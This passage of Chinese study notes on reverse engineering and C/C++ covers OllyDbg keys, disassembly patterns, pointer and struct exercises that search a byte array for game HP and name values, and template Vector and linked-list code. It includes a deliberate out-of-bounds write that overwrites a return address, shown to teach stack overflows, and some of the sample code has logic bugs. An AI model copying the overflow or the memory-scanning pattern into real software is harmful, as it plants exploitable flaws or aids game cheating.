*：转到原始位置 Ctrl+*：指定新的起始位置。 +：如果 Run 跟踪没有激活，则根据历史命令跳到下一条运行过命令的地方；否则跳到 Run 跟踪的下一个记录。 Ctrl++：跳到前一个函数的开始处。 -：如果 Run 跟踪没有激活，则根据历史命令跳到前一条运行过命令的地方；否则跳到 Run 跟踪的前一个记录。 Ctrl+-：跳到下一个函数的开始处。 Space：修改命令。 :：添加标签。 ;：添加注释。  -（减号）：回看之前单步跟踪的代码","title":"[工具]Ollydbg"},{"content":"裸函数 void __declspec(naked) Function() //编译器不执行格外操作\r{\r__asm //在c中调用汇编格式__asm{}\r{\rret } //需要手动写ret才能正常运行\r}\r常见的几种调用约定：\n__cdecl:默认调用约定。外平栈。\n__stdcall:内平栈。\n__fastcall:2个参数以内时，直接用寄存器存取数据，提高执行速度。内平栈。\n浮点数的存储 以12.5为例\n符号部分：正数为0，负数为1\n12=\u0026raquo; c =\u0026raquo; 1100\n0.5 乘二取整 1.0 =\u0026raquo;1\n12.5 =\u0026raquo; 1100.1 =\u0026raquo; 1.1001 * 10^3\n尾数部分： 1001 0000000000000000000\n指数部分：127 + 3 = 130 =\u0026raquo; 1000 0010 //127 + 指数计算即可\n0 1000 0010 1001 0000000000000000000\n内存图 全局变量\u0026amp;局部变量 mov [ arr (00427326)] ，eax //全局变量\rmov dword ptr [ebp-4] , 6Ah //局部变量\rmov dword ptr [ebp-8], 14h\r全局变量\n1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面\n2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.\n3、全局变量所占内存会一直存在，知道整个进程结束.\n4、全局变量的反汇编识别：\nMOV寄存器，byte/word/dword ptr ds: [0x12345678] 通过寄存器的宽度，或者byte/word/dword来判断全局变量的宽度\n全局变量就是所谓的基址\n局部变量的特点：\n1、局部变量在程序编译完成后并没有分配固定的地址.\n2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.\n3、当局部变量所属的方法执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.\n4、局部变量只能在方法内部使用，函数A无法使用函数B的局部变量.\n5、局部变量的反汇编识别：\n[ebp-4] [ebp-8] [ebp-0xC]\nif else 逆向 #include \u0026lt;iostream\u0026gt;\rint a;\rvoid test1(int x, int y) {\rint z = a;\rif (x \u0026lt;= y) {\ra = x + y;\r}\rreturn;\r}\rint a2;\rvoid test2(int d, int e) {\rint b = a2;\rint c=2;\rif (d \u0026gt;= e)\rc = c + 1;\rif (d \u0026lt; e)\ra = c;\relse\ra = b + c;\r}\rint main() {\rint x = 1, y = 2;\r//test1(x, y);\rtest2(x, y);\rreturn 0;\r}\r数组缓冲区溢出 void Fun()\t{\tint arr[5] = {1,2,3,4,5};\tarr[6] = (int)HelloWord;\t}\tcall 指令 堆栈图\n个人理解：\n当数组作为局部变量时，在缓存区中是从上往下存的。如：定义int ARRAY[3]={0,1,2}.在堆栈图如图这样存储。\n这时，给ARRAY[2],ARRAY[3]赋值就会覆盖EBP,EIP的值，造成缓存区溢出。\nswitch\u0026amp;where\u0026amp;for\u0026amp;do\u0026hellip;.where反汇编 switch\n1、switch语句 是if语句的简写，case后面的值只能是整数，不允许变量\n2、添加case后面的值，一个一个增加，观察反汇编代码的变化(何时生成大表).\n 当case 后面的值 连续的n个时，会生成大表（节省内存）\n 3、将3中的常量值的顺序打乱，观察反汇编代码(观察顺序是否会影响生成大表).\n 例如0，1，2，3，4，50，不生成大表\n 4、将case后面的值改成从100开始到109，观察汇编变化(观察值较大时是否生成大表).\n 生成大表 ，sub 100\n 5、将连续的10项中抹去1项或者2项，观察反汇编有无变化(观察大表空缺位置的处理).\n 抹去值较少时，只生成大表，空缺的地方会用default执行语句的地址\n 6、在10项中连续抹去，不要抹去最大值和最小值(观察何时生成小表). 7、将case后面常量表达式改成亳不连续的值，观察反汇编变化.\n 抹去值较多时，生成大表，同时生成小表，存default最后一位的地址\n 总结：使用switch语句时，case尽量连续，编译器会生成大表提高效率。如果case不规律switch基本等同于if语句。区别在于switch反汇编会把比较条件放在一块，而if\u0026hellip;else比较条件和执行内容相间。\n指针 //实现数组值的互换\r#include\u0026lt;stdio.h\u0026gt;\rvoid Fun4()\r{\rint arr[5] = { 1,2,3,4,5 };\r//..此处添加代码，使用指针，将数组的值倒置\rint* p =arr;\rfor(int i = 0; i\u0026lt;(5/2); i++)\r{\rint t = *(p+i);\r*(p+i) = *(p+4-i);\r*(p+4-i) = t;\r}\rfor (int k =0;k\u0026lt;5;++k)\r{\rprintf(\u0026quot;%d\\n\u0026quot;, *(p + k));\r}\r}\rint main(){\rFun4();\rreturn 0 ;\r}\r这一堆数据中存储了角色的血值信息，假设血值的类型为int类型，值为100(10进制)请列出所有可能的值以及该值对应的地址.\n方法一：\n#include\u0026lt;stdio.h\u0026gt;\rchar data[100] = {\r0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,\r0x00,0x20,0x10,0x03,0x03,0x0c,0x00,0x00,0x33,0x00,\r0x00,0x33,0x00,0x47,0x0c,0x0e,0x00,0x0d,0x00,0x11,\r0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xaa,0x00,\r0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\r0x00,0x01,0x02,0x00,0x74,0x0f,0x41,0x00,0x00,0x00,\r0x01,0x01,0x02,0x00,0x05,0x00,0x00,0x00,0x0a,0x00,\r0x00,0x02,0x74,0x0f,0x41,0x00,0x06,0x08,0x00,0x00,\r0x00,0x00,0x00,0x64,0x00,0x0f,0x00,0x00,0x0d,0x00,\r0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\r};\r//假设该数据排列是由地位到高位\rvoid FindBloodAddr(char* p[])\r{\rint k = 0;\r//memset(p, 0, sizeof(char*) * 10);\rfor (int i = 0; i \u0026lt; 100-3;)\r{\rif (data[i] == 0x64)\r{ //小端字节序所以是查,0x64,0x00,0x00,0x00,\rif (data[i + 1] == 0x00 \u0026amp;\u0026amp; data[i + 2] == 0x00 \u0026amp;\u0026amp; data[i + 3] == 0x00)//if (data[i -1] == 0x00 \u0026amp;\u0026amp; data[i - 2] == 0x00 \u0026amp;\u0026amp; data[i - 3] == 0x00) //\r{\rp[k++] = \u0026amp;data[i];\rprintf(\u0026quot;%d\\n\u0026quot;,i);\ri += 4;\rcontinue;\r}\ri++;\r}\relse\r{\r++i;\r}\r}\r}\rint main()\r{\rchar* p[10];\rFindBloodAddr(p);\rreturn 0;\r}\r方法二：\n#include\u0026lt;stdio.h\u0026gt;\rvoid Function()\r{\rchar date[100] = {\r0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\r0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\r0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\r0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\r0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\r0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\r0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\r0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\r0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\r0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\r};\rchar* p=date;\rint* x;\rfor(int i=0; i\u0026lt;96; i++)\r{\rx=(int*)(p+i);\rif(*x == 0x64)\rprintf(\u0026quot;%x对应的地址是%x下标为%d\u0026quot;,*x,x,i);\r}\r}\rint main()\r{\rFunction();\rreturn 0;\r}\r#include\u0026lt;stdio.h\u0026gt;\rchar gameData[] = {\r0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\r0x00,0x20,0x10,0x03,0x03,0x0c,0x00,0x00,0x44,0x00,\r0x00,0x33,0x00,0x47,0x0c,0x0e,0x00,0x0d,0x00,0x11,\r0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xaa,0x00,\r0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\r0x00,0x00,0x02,0x00,0x74,0x0f,0x41,0x00,0x00,0x00,\r0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0a,0x00,\r0x00,0x02,0x57,0x4f,0x57,0x00,0x06,0x08,0x00,0x00,\r0x00,0x00,0x00,0x64,0x00,0x0f,0x00,0x00,0x0d,0x00,\r0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\r};\rchar* FindRoleNameAddr(char* pData, char* pRoleName)\r{\rchar* ret = 0;\rint i = 100;\rwhile(i--)\r{\rwhile (*(ret=pData++) == *pRoleName)\r{\rchar *s1 = ret, *s2 = pRoleName;\rwhile (*s1++ == *s2++)\r{\rif (!*s2)\rreturn ret;\r}\r}\r}\rreturn 0;\r}\rvoid printRoleName(char* pData)\r{\rint i = 100;\rwhile (i--)\r{\rwhile ((*pData\u0026gt;'A'\u0026amp;\u0026amp;*pData\u0026lt;'Z') || (*pData\u0026gt;'a'\u0026amp;\u0026amp;*pData\u0026lt;'z'))\r{\rprintf(\u0026quot;%c\u0026quot;,*pData++);\r}\rpData++;\rprintf(\u0026quot;\\n\u0026quot;);\r}\r}\rint main()\r{\rchar* x=FindRoleNameAddr(gameData, \u0026quot;WOW\u0026quot;);\rprintf(\u0026quot;%d\\n\u0026quot;,x);\rprintRoleName(gameData);\rreturn 0;\r}\r1.创建一个int* arr[5]数组，并为数组赋值（使用\u0026amp;）\rvoid Fun1()\r{\rint* arr[5];\rint a1 = 10;\rint a2 = 20;\rint a3 = 30;\rint a4 = 40;\rint a5 = 50;\rarr[0] = \u0026amp;a1;\rarr[1] = \u0026amp;a2;\rarr[2] = \u0026amp;a3;\rarr[3] = \u0026amp;a4;\rarr[4] = \u0026amp;a5;\r}\r2.创建一个字符指针数组，存储所有的C的关键词，并全部打印出来\rvoid Fun2()\r{\rchar* keyword[] = {\r\u0026quot;auto\u0026quot;,\u0026quot;double\u0026quot;,\u0026quot;int\u0026quot;,\u0026quot;struct\u0026quot;,\u0026quot;break\u0026quot;,\u0026quot;else\u0026quot;, \u0026quot;long\u0026quot; ,\u0026quot;switch\u0026quot;,\r\u0026quot;case\u0026quot; ,\u0026quot;enum\u0026quot; ,\u0026quot;register\u0026quot;, \u0026quot;typedef\u0026quot; ,\u0026quot;char\u0026quot;, \u0026quot;extern\u0026quot; ,\u0026quot;return\u0026quot; ,\u0026quot;union\u0026quot;,\r\u0026quot;const\u0026quot;, \u0026quot;float\u0026quot;, \u0026quot;short\u0026quot;, \u0026quot;unsigned\u0026quot;, \u0026quot;continue\u0026quot;, \u0026quot;for\u0026quot;, \u0026quot;signed\u0026quot;, \u0026quot;void\u0026quot;,\r\u0026quot;default\u0026quot;, \u0026quot;goto\u0026quot;, \u0026quot;sizeof\u0026quot;, \u0026quot;volatile\u0026quot;, \u0026quot;do\u0026quot;, \u0026quot;if\u0026quot;, \u0026quot;while\u0026quot;, \u0026quot;static\u0026quot; };\rfor(int i = 0; i \u0026lt; 32 ; i++)\r{\rprintf(\u0026quot;%s, \u0026quot;, keyword[i]); }\r}\r3.查找这些数据中，有几个id=1 level=8的结构体信息 void Fun3()\r{\rchar data[] = {\r0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\r0x00,0x20,0x10,0x03,0x03,0x0c,0x00,0x00,0x44,0x00,\r0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\r0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xaa,0x00,\r0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\r0x00,0x00,0x02,0x00,0x74,0x0f,0x41,0x00,0x00,0x00,\r0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0a,0x00,\r0x00,0x02,0x57,0x4f,0x57,0x00,0x06,0x08,0x00,0x00,\r0x00,0x00,0x00,0x64,0x00,0x0f,0x00,0x00,0x00,0x00,\r0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 };\rint count = 0;\rPlayer _target = { 1,8 };\rchar *_data = data;\rchar* ptarget = \u0026amp;_target;\rint i = 100;\rwhile (i--)\r{\rif (*_data++ == *ptarget)\r{\rchar *s1 = _data, *s2 = ptarget + 1;\rint j = sizeof(Player) - 1;\rwhile (*s1++ == *s2++)\r{\rj--;\rif (!j)\r{\rcount++;\rbreak;\r}\r}\r}\r}\r}\r结构体指针 题目：查找这些数据中，有几个id=1 level=8的结构体信息。\t0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t结构体定义如下：\ttypedef struct TagPlayer\t{\tint id;\rint level;\r}Player;\t#include \u0026quot;strxx.h\u0026quot;\r#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;stdio.h\u0026gt;\rtypedef struct TagPlayer\r{\rint id;\rint level;\r}Player;\rint main()\r{\runsigned char Mem[] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\r0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\r0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\r0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\r0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\r0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\r0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\r0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\r0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\r0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 };\rPlayer *sPlayer;\rint nSum = 0;\rfor (int i=0;i\u0026lt;sizeof(Mem)-sizeof(Player);i++)\r{\rsPlayer = (Player *)\u0026amp;Mem[i];\rif (1 == sPlayer-\u0026gt;id \u0026amp;\u0026amp; 8 == sPlayer-\u0026gt;level)\rnSum++;\r}\rprintf(\u0026quot;结构体个数为%d\\n\u0026quot;, nSum);\rgetchar();\rreturn 0;\r}\r数组指针 c++ 引用 text(a) // a 可能为int int\u0026amp;\r继承是数据的复制\n模板是代码的复制\n运算符重载\u0026amp;友元 友元\n什么情况下需要友元函数: (1) 运算符重载的某些场合需要使用友元. (2)两个类要共享数据的时候. 友元函数和类的成员函数的区别： (1)成员函数有this指针，而友元函数没有this指针 (2)友元函数是不能被继承的，就像父亲的朋友未必是儿子的\n1、运算符重载就是函数替换\n2、. :: ?: sizeof # 不能重载\n引用类型\tstruct Base\t{\tint x;\tint y;\tBase(int x,int y)\t{\tthis-\u0026gt;x = x;\tthis-\u0026gt;y = y;\t}\t};\tvoid PrintByPoint(Base* pb)\t{\tprintf(\u0026quot;%d %d\\n\u0026quot;,pb-\u0026gt;x,pb-\u0026gt;y);\tpb = (Base*)0x123456;\t//为所欲为...\t}\tvoid PrintByRef(Base\u0026amp; refb,Base* pb)\t{\tprintf(\u0026quot;%d %d\\n\u0026quot;,refb.x,refb.y);\tBase b1(21,31);\t//\u0026amp;refb = b1; //引用不能重新赋值\trefb = b1; //这个不是重新赋值，这个是把b1的值赋给refb代表的对象\tprintf(\u0026quot;%d %d\\n\u0026quot;,pb-\u0026gt;x,pb-\u0026gt;y);\t}\t为了避免出现这种情况，可以将refb声明为常量，不可修改：\tvoid PrintByRef(const Base\u0026amp; refb)\t{\tprintf(\u0026quot;%d %d\\n\u0026quot;,refb.x,refb.y);\tBase b1(21,31);\t//\u0026amp;refb = b1; //引用不能重新赋值\t//refb = b1; //不允许\t}\tint main(int argc, char* argv[])\t{\tBase base(1,2);\tPrintByRef(base,\u0026amp;base);\treturn 0;\t}\t总结：\t1、引用类型是C++里面的类型\t2、引用类型只能赋值一次，不能重新赋值\t3、引用只是变量的一个别名.\t4、引用可以理解成是编译器维护的一个指针，但并不占用空间(如何去理解这句话？).\t5、使用引用可以像指针那样去访问、修改对象的内容，但更加安全.\tVector动态数组实现  记一个坑： **在myclass.cpp（实现函数具体功能）和对应的myclass.h（声明函数）**使用template 时，vs2019会报错“无法解析的外部符号”。\n原因：编译器编译时会给函数生成新的名字，两个文件的函数名不一样就会报错。（待求证）\n解决方案：将函数的声明和具体实现写在同一个文件中。\n #include\u0026lt;stdio.h\u0026gt;\r#include\u0026lt;Windows.h\u0026gt;\r#define SUCCESS 1 // 成功\t#define ERROR -1 // 失败\t#define MALLOC_ERROR\t-2 // 申请内存失败\t#define INDEX_ERROR\t-3 // 错误的索引号\ttemplate \u0026lt;class T_ELE\u0026gt;\rclass Vector\r{\rpublic:\rVector();\rVector(DWORD dwSize);\r~Vector();\rpublic:\rDWORD\tat(DWORD dwIndex, OUT T_ELE* pEle);\t//根据给定的索引得到元素\tDWORD push_back(T_ELE Element);\t//将元素存储到容器最后一个位置\tVOID\tpop_back();\t//删除最后一个元素\tDWORD\tinsert(DWORD dwIndex, T_ELE Element);\t//向指定位置新增一个元素\tDWORD\tcapacity();\t//返回在不增容的情况下，还能存储多少元素\tVOID\tclear();\t//清空所有元素\tBOOL\tempty();\t//判断Vector是否为空 返回true时为空\tDWORD\terase(DWORD dwIndex);\t//删除指定元素\tDWORD\tsize();\t//返回Vector元素数量的大小\tprivate:\rBOOL\texpand();\rprivate:\rDWORD m_dwIndex;\t//下一个可用索引\tDWORD m_dwIncrement;\t//每次增容的大小\tDWORD m_dwLen;\t//当前容器的长度\tDWORD m_dwInitSize;\t//默认初始化大小\tT_ELE* m_pVector;\t//容器指针\t};\rtemplate \u0026lt;class T_ELE\u0026gt;\rVector\u0026lt;T_ELE\u0026gt;::Vector()\r:m_dwInitSize(10), m_dwIncrement(5)\r{\r//1.创建长度为m_dwInitSize个T_ELE对象\tm_pVector = new T_ELE[m_dwInitSize];\r//2.将新创建的空间初始化\tmemset(m_pVector, 0, sizeof(T_ELE) * m_dwInitSize);\r//3.设置其他值\tm_dwIndex = 0;\rm_dwLen = m_dwInitSize;\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rVector\u0026lt;T_ELE\u0026gt;::Vector(DWORD dwSize)\r:m_dwIncrement(5)\r{\r// 1.创建长度为m_dwInitSize个T_ELE对象\rm_pVector = new T_ELE[dwSize];\r//2.将新创建的空间初始化\tmemset(m_pVector, 0, sizeof(T_ELE) * dwSize);\r//3.设置其他值\tm_dwIndex = 0;\rm_dwLen = dwSize;\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rVector\u0026lt;T_ELE\u0026gt;::~Vector()\r{\r//释放空间 delete[]\tdelete[] m_pVector;\rm_pVector = NULL;\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rBOOL Vector\u0026lt;T_ELE\u0026gt;::expand()\r{\rDWORD dwLenTemp = 0;\rT_ELE* pVectorTemp = NULL;\r// 1. 计算增加后的长度\tdwLenTemp = m_dwLen + m_dwIncrement;\r// 2. 申请空间\tpVectorTemp = new T_ELE[dwLenTemp];\rmemset(pVectorTemp, 0, sizeof(T_ELE) * dwLenTemp);\r// 3. 将数据复制到新的空间\tmemcpy(pVectorTemp, m_pVector, sizeof(T_ELE) * m_dwLen);\r// 4. 释放原来空间\tdelete[] m_pVector;\rm_pVector = pVectorTemp;\rpVectorTemp = NULL;\r// 5. 为各种属性赋值\rm_dwLen = dwLenTemp;\rreturn SUCCESS;\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::push_back(T_ELE Element)\r{\r//1.判断是否需要增容，如果需要就调用增容的函数\tif (m_dwIndex \u0026gt;= m_dwLen)\r{\rexpand();\r}\r//2.将新的元素复制到容器的最后一个位置\tmemcpy(\u0026amp;m_pVector[m_dwIndex], \u0026amp;Element, sizeof(T_ELE));\r//3.修改属性值\tm_dwIndex++;\rreturn SUCCESS;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rVOID Vector\u0026lt;T_ELE\u0026gt;::pop_back() //删除最后一个元素\t{\rmemset(\u0026amp;m_pVector[--m_dwIndex], 0, sizeof(T_ELE));\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::insert(DWORD dwIndex, T_ELE Element)\r{\r//1.判断索引是否在合理区间\tif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwIndex)\r{\rreturn INDEX_ERROR;\r}\r//2.判断是否需要增容，如果需要就调用增容的函数\tif (m_dwIndex \u0026gt;= m_dwLen)\r{\rexpand();\r}\r//3.将dwIndex只后的元素后移\tfor (DWORD i = m_dwIndex; i \u0026gt; dwIndex; i--)\r{\rmemcpy(\u0026amp;m_pVector[i], \u0026amp;m_pVector[i - 1], sizeof(T_ELE));\r}\r//4.将Element元素复制到dwIndex位置\tmemcpy(\u0026amp;m_pVector[dwIndex], \u0026amp;Element, sizeof(T_ELE));\r//5.修改属性值\tm_dwIndex++;\rreturn SUCCESS;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::capacity()\r{\rDWORD capacity = 0;\rcapacity = m_dwLen - m_dwIndex;\rreturn capacity;\r}\rtemplate \u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::at(DWORD dwIndex, OUT T_ELE* pEle)\r{\r//判断索引是否在合理区间\tif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwIndex)\r{\rreturn INDEX_ERROR;\r}\r//将dwIndex的值复制到pEle指定的内存\tmemcpy(pEle, \u0026amp;m_pVector[dwIndex], sizeof(T_ELE));\rreturn SUCCESS;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rVOID Vector\u0026lt;T_ELE\u0026gt;::clear() //清空所有元素\r{\rmemset(m_pVector, 0, sizeof(T_ELE) * m_dwIndex);\r//delete[] m_pVector;\rm_dwIndex = 0;\rm_dwLen = 0;\r//m_pVector = NULL;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rBOOL Vector\u0026lt;T_ELE\u0026gt;::empty()\r{\rif (m_dwIndex != 0 || m_pVector != NULL)\r{\rreturn FALSE;\r}\rreturn TRUE;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::erase(DWORD dwIndex)\r{\rif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwIndex)\r{\rreturn INDEX_ERROR;\r}\rfor (DWORD i = dwIndex; i \u0026lt; m_dwIndex; i++)\r{\rmemcpy(\u0026amp;m_pVector[i], \u0026amp;m_pVector[i + 1], sizeof(T_ELE));\r}\rm_dwIndex--;\rreturn SUCCESS;\r}\rtemplate\u0026lt;class T_ELE\u0026gt;\rDWORD Vector\u0026lt;T_ELE\u0026gt;::size() //返回Vector元素数量的大小\r{\rreturn m_dwLen;\r}\rVOID TestVector()\r{\rint at = 0;\rVector\u0026lt;int\u0026gt;* pVector = new Vector\u0026lt;int\u0026gt;(5);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\r//printf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;push_back(1);\rpVector-\u0026gt;insert(0, 2);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(2);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(3);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(4);\rpVector-\u0026gt;insert(4, 6);\rpVector-\u0026gt;insert(1, 7);\r//printf(\u0026quot;at: %x\\n\u0026quot;, pVector-\u0026gt;at(7,\u0026amp;at));\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(5);\rpVector-\u0026gt;insert(5, 8);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;erase(1);\rpVector-\u0026gt;erase(2);\rpVector-\u0026gt;erase(3);\rpVector-\u0026gt;push_back(6);\r//printf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(7);\rpVector-\u0026gt;push_back(8);\rpVector-\u0026gt;push_back(9);\rpVector-\u0026gt;push_back(10);\rpVector-\u0026gt;insert(5, 11);\rpVector-\u0026gt;push_back(11);\rprintf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;clear();\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;push_back(1);\rpVector-\u0026gt;insert(0, 2);\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;push_back(2);\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;push_back(3);\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;push_back(4);\rpVector-\u0026gt;insert(4, 6);\rpVector-\u0026gt;insert(1, 7);\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(5);\rpVector-\u0026gt;insert(5, 8);\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;erase(1);\rpVector-\u0026gt;erase(2);\rpVector-\u0026gt;erase(3);\rpVector-\u0026gt;push_back(6);\r//printf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\r//printf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rpVector-\u0026gt;push_back(7);\rpVector-\u0026gt;push_back(8);\rpVector-\u0026gt;push_back(9);\rpVector-\u0026gt;push_back(10);\rpVector-\u0026gt;insert(5, 11);\rpVector-\u0026gt;push_back(11);\rprintf(\u0026quot;capacity: %x\\n\u0026quot;, pVector-\u0026gt;capacity());\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rprintf(\u0026quot;size: %x\\n\u0026quot;, pVector-\u0026gt;size());\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\rpVector-\u0026gt;pop_back();\r}\rint main()\r{\rTestVector();\rreturn 0;\r}\r链表 #include\u0026lt;stdio.h\u0026gt;\r#include\u0026lt;Windows.h\u0026gt;\r#define SUCCESS 1 // 执行成功\t#define ERROR -1 // 执行失败\t#define INDEX_IS_ERROR -2 // 错误的索引号\t#define BUFFER_IS_EMPTY -3 // 缓冲区已空\ttemplate\u0026lt;class T_ELE\u0026gt;\rclass NODE\r{\rpublic:\rT_ELE Data;\rNODE\u0026lt;T_ELE\u0026gt;* pNext;\r};\rtemplate \u0026lt;class T_ELE\u0026gt;\rclass LinkedList :public NODE\u0026lt;T_ELE\u0026gt;\r{\rpublic:\rLinkedList(); //默认构造函数\r~LinkedList();\rpublic:\rBOOL IsEmpty();\t//判断链表是否为空 空返回1 非空返回0\tDWORD Clear();\t//清空链表\tDWORD GetElement(IN DWORD dwIndex, OUT T_ELE\u0026amp; Element);\t//根据索引获取元素\tDWORD GetElementIndex(IN T_ELE\u0026amp; Element);\t//根据元素获取链表中的索引\tDWORD Insert(IN T_ELE Element);\t//新增元素\tDWORD Insert(IN DWORD dwIndex, IN T_ELE Element);\t//根据索引新增元素\tDWORD Delete(IN DWORD dwIndex);\t//根据索引删除元素\tDWORD GetSize();\t//获取链表中元素的数量\rVOID Show();\rprivate:\rNODE\u0026lt;T_ELE\u0026gt;* m_head;\t//链表头指针，指向第一个节点\tDWORD m_dwLength;\t//元素的数量\t};\r//无参构造函数 初始化成员\ttemplate\u0026lt;class T_ELE\u0026gt; 